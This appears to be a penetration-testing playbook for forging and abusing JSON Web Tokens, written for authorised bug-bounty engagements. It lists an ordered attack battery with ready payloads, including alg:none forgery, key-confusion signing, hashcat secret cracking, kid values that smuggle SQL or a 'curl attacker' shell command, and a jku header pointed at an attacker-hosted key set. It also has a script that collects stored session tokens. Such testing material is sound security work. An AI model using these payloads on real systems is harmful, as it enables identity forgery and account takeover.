# Moraa — JWT attacks (forge identity / bypass authz)

> Folds in HackTricks `hacking-jwt`, disclosed H1 (#1760403 Linktree exp-in-past ATO, #1210502 Jitsi
> external-issuer, #1889161 aud not validated), PentesterLab/PortSwigger labs, and our own the vendor
> VENDOR_SSO_AUTH battery (RS256/4096-bit, all forging **rejected** — but logout non-revocation on
> `enterprise.svc` = Medium). Deep pack: `offensive-jwt` skill. Cross-ref [[auth-oauth]].

## First: decode + fingerprint (one step, no tools needed)
```bash
# header + payload
for i in 1 2; do echo "$JWT" | cut -d. -f$i | tr '_-' '/+' | base64 -d 2>/dev/null; echo; done
```
Record: `alg`, `kid`, `iss`, `jku`/`x5u`/`jwk` present?, `exp`/`iat`, and every identity/authz claim
(`sub`, `uid`, `role`, `scope`, `aud`, tenant/org id, a step-up flag like our `L2`). Pull the JWKS:
`GET {iss}/.well-known/openid-configuration → jwks_uri`. **Signature verified over the full payload
means claim-tamper is rejected — that's the control you're trying to break with the tests below.**

### Engagement hygiene: key your credential table on `session`, NOT on `exp` or filename
Lesson from that enterprise-identity estate (2026-09): two agents disagreed on whether the same-looking `VENDOR_SSO_AUTH` was
alive. One tested a token with `exp` **2026-09-29** → `401 Session expired`; another used a token with
`exp` **2026-09-17** → full live OAuth2 flow. Decoding both showed **different `session` UUIDs** — the
issuer revokes server-side per session, so a *later*-expiring token can be dead while an
*earlier*-expiring one lives. Burning hours re-testing "the expired token" is the failure mode.

```bash
# inventory EVERY stored token in an engagement, keyed on the session claim
for f in $(grep -rl 'AUTH=ey' recon/); do
  t=$(grep -o 'AUTH=ey[A-Za-z0-9_.-]*' "$f" | head -1 | sed 's/.*AUTH=//')
  p=$(echo "$t" | cut -d. -f2); pad=$(( (4-${#p}%4)%4 )); p="$p$(printf '=%.0s' $(seq 1 $pad))"
  echo "$f => $(echo "$p" | tr '_-' '/+' | base64 -d 2>/dev/null)"
done
```
Record per artifact: `session` (or `sid`/`jti`), `sub`, `exp`, and any step-up claim (`L2`, `acr`,
`amr`). Two rows with the same `session` and different `exp` are just rolling refreshes of ONE
session — test one, you've tested both. Different `session` = an independent liveness question.
Corollary finding angle: if a *logged-out* session's token still works anywhere, that's the
non-revocation bug (we scored Medium on `enterprise.svc` exactly this way).

## The battery — run in this order (yield-first)
| # | Attack | How | Wins when |
|---|---|---|---|
| 1 | **alg:none** | header `{"alg":"none"}` (also `None`/`NONE`/`nOnE`), drop signature, keep trailing dot | server doesn't pin alg / accepts unsigned |
| 2 | **RS256→HS256 confusion** | HMAC-sign the token using the **RSA public key** (PEM) as the secret. `jwt_tool $T -X k -pk pubkey.pem` or Burp JWT-Editor → "HMAC Key Confusion" | server verifies with a generic `verify(token, key)` that picks alg from the header → treats pubkey as HMAC secret. Try PEM, DER, PKCS1, with & without trailing newline. |
| 3 | **weak HMAC secret** | `hashcat -a0 -m16500 jwt.txt rockyou.txt -r best64.rule` (offline, GPU) | HS256 with a guessable/default secret (`secret`, app name, leaked key). Our chatjwt was HS256 — needs a real GPU run outside a sandbox. |
| 4 | **kid injection** | path traversal `kid:"../../../dev/null"` + empty HMAC secret `""`; **SQLi** `kid:"x' UNION SELECT 'attacker'-- -"`; **command inj** `kid:"key;curl attacker"` | server loads the verify key by `kid` from FS/DB/shell — the classic under-tested, bounty-winning class |
| 5 | **jku / x5u injection** | point `jku`/`x5u` header at attacker JWKS/cert (or a `*.target.com` you control / open-redirect), sign with your key. `jwt_tool $T -I -hc jku -hv https://attacker/jwks.json` | server fetches the key from the header URL without allowlisting the host |
| 6 | **jwk embed (CVE-2018-0114)** | embed your own public key in the `jwk` header, sign with its private key | server trusts an in-token key |
| 7 | **x5c manipulation** | replace `x5c` cert chain with a self-signed one, re-sign | server trusts `x5c` without chain validation |
| 8 | **exp / claim tamper** | set `exp` to a past OR far-future unix ts; also swap `sub`/`uid`/`role`/`aud`/tenant id | **any service that skips validation** — Linktree ATO (#1760403) was exactly exp-in-past accepted; #1889161 was `aud` unchecked. Test EVERY downstream service, not just the issuer. |
| 9 | **JWE-wraps-plain (pac4j CVE-2026-29000)** | wrap an inner `alg:none` PlainJWT inside a JWE encrypted to the server's public JWKS key | server decrypts then trusts the inner unsigned token |
| 10 | **Header smuggling / `cty` confusion** | `cty:"JWT"` to chain another JWT inside (some libs unwrap it); duplicate keys in the JSON header (parsers disagree on first-vs-last wins); trailing data appended after the signature (some parsers ignore it silently) | parser is lenient on header shape, not just signature |
| 11 | **Sliding-window / unenforced temporal claims** | replay a token with `exp` far in the past, or `nbf` in the future | server never checks `exp`/`nbf` at all — a long-expired admin token still works |

> **Row 2 variant — whitespace re-enablement (CVE-2026-34950, fast-jwt):** if a target has already
> patched classic RS256→HS256 confusion (library pins the algorithm), still try prepending/
> appending whitespace to the token before the alg-pinning check runs (` eyJhbGc...` with a leading
> space/newline/tab). A library's fix can pin the *parsed* alg value while a parser-vs-verifier
> discrepancy on whitespace-trimming lets the same confusion attack slip back through — the general
> pattern (a "fixed" JWT library re-exposing an old confusion class via a parser-quirk edge case) is
> worth testing on any library-version target claiming the fix, not just fast-jwt specifically.

Tooling: `jwt_tool.py <JWT> -M at -t <url> -rh "Authorization: Bearer <JWT>"` runs all modes; Burp JWT-Editor for visual re-sign.

## The tests people SKIP (where the money is)
- **Per-service inconsistency (our finding + Linktree):** the *issuer* may verify perfectly, but a
  downstream microservice behind the gateway may (a) accept a tampered/expired token, (b) not check
  `aud`, or (c) **not honor logout/revocation**. Replay the token against EVERY distinct backend, and
  after logout. Our the vendor Medium: `sso.acme.example` revoked on logout instantly, `enterprise.svc` kept
  accepting the same JWT 10+ min → stolen 30-day cookie survives the IR "log out" action.
- **alg confusion needs the RIGHT public key:** if JWKS isn't exposed, recover the RSA public key
  from two tokens (`rsa_sign2n` / `jwt_forgery`) or from a TLS cert.
- **kid is an injection sink, not just a selector** — always try SQLi/traversal/cmd in it.
- **`aud`/`iss` cross-acceptance:** does a token minted for app A work on app B? (Jitsi #1210502 —
  external issuer accepted.) Does staging-SSO issue tokens prod accepts?
- **step-up / MFA claims in the token:** if a claim like `L2`/`amr`/`acr` gates step-up and the token
  is self-contained, test whether adding/extending it bypasses step-up — but only lands if forging
  works (ours didn't, because signature was enforced; the step-up bypass was a separate app bug).

## Confirm impact honestly
A forged token is only a finding when a **protected endpoint returns 200** to it (or performs a
privileged action). Show that request/response. "The server rejected all my forgeries" is a valid,
useful result — write it as *JWT layer hardened*, then pivot to session-lifecycle (logout/revocation,
replay) and per-service consistency, which are where hardened-crypto estates still leak.
